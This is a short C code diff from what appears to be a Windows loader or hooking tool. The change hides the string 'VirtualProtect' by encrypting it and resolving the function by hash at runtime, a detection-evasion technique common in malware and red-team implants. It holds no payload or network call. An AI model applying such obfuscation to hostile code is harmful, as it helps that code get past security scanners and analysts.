@@ -20,7 +20,8 @@ static int ph_ensure(void) {
     char fn[32];
     enc_decrypt(enc_GetModuleHandleW, ENC_GETMODULEHANDLEW_LEN, fn);
     g_ph_api.pGHMW = (pGHMW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
-    g_ph_api.pVP = (pVP)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func("VirtualProtect"));
+    enc_decrypt(enc_VirtualProtect, ENC_VIRTUALPROTECT_LEN, fn);
+    g_ph_api.pVP = (pVP)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
     if (!g_ph_api.pGHMW || !g_ph_api.pVP) return 0;
     g_ph_api.ready = 1;
     return 1;
